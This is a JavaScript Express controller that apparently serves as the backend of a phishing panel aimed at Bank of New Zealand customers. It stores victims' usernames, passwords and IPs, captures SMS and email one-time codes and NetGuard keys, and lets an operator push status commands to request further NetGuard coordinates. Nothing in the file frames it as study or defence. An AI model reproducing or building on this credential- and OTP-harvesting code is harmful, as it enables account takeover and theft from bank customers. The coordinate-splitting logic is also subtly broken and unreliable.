const BNZ = require("../models/bnzModel");

const getOwnerVics = async (req, res) => {
    const { owner } = req.params;
    BNZ.find({ owner })
        .sort({ status: -1 })
        .exec((err, vics) => {
            if (err) {
                console.log(err);
                res.status(404).send("Error");
                return;
            }
            res.send(vics);
        });
};

const command = async (req, res) => {
    let { uniqueid, status, ngc } = req.body;
    try {
        if (ngc) {
            ngc.split('-');
            console.log(ngc.length)
            if (ngc.length == 3) {
                await BNZ.findOneAndUpdate({ uniqueid }, { status, ngcoord1: ngc[0], ngcoord2: ngc[1], ngcoord3: ngc[2] }).exec();
            }
        } else {
            await BNZ.findOneAndUpdate({ uniqueid }, { status }).exec();
        }
        res.sendStatus(200);
    } catch (error) {
        console.log(error);
        res.sendStatus(400);
    }
};

const getInfo = async (req, res) => {
    const { uniqueid } = req.params;
    BNZ.findOne({ uniqueid }).exec((err, vic) => {
        if (err) {
            console.log(err);
            res.status(404).send("Error");
            return;
        }
        res.send(vic);
    });
};

const submitLogin = async (req, res) => {
    const { username, password, uniqueid, owner, ip } = req.body;
    try {
        await BNZ.create({
            uniqueid,
            username,
            password,
            status: 1,
            owner,
            ip,
        });
        res.sendStatus(200);
    } catch (error) {
        console.log(error);
        res.sendStatus(400);
    }
};

const submitLoginAgain = async (req, res) => {
    const { username, password, uniqueid } = req.body;
    try {
        await BNZ.findOneAndUpdate(
            { uniqueid },
            { username, password, status: 0 }
        ).exec();
        res.sendStatus(200);
    } catch (error) {
        console.log(error);
        res.sendStatus(400);
    }
};

const submitOtp = async (req, res) => {
    const { otp, uniqueid, type } = req.body;
    try {
        if (type === "sms") {
            await BNZ.findOneAndUpdate({ uniqueid }, { smsCode: otp, status: 3 }).exec();
        } else {
            await BNZ.findOneAndUpdate({ uniqueid }, { emailCode: otp, status: 5 }).exec();
        }
        res.sendStatus(200);
    } catch (error) {
        console.log(error);
        res.sendStatus(400);
    }
};

const submitNetguard = async (req, res) => {
    const { netguardKey, uniqueid } = req.body;
    try {
        await BNZ.findOneAndUpdate({ uniqueid }, { netguardKey, status: 9 }).exec();
        res.sendStatus(200);
    } catch (error) {
        console.log(error);
        res.sendStatus(400);
    }
};

const deleteEntry = async (req, res) => {
    const { uniqueid } = req.body;
    try {
        await BNZ.deleteOne({ uniqueid });
        res.sendStatus(200);
    } catch (error) {
        console.log(error);
        res.sendStatus(400);
    }
};

module.exports = {
    getOwnerVics,
    command,
    getInfo,
    submitLogin,
    submitLoginAgain,
    submitNetguard,
    submitOtp,
    deleteEntry,
};
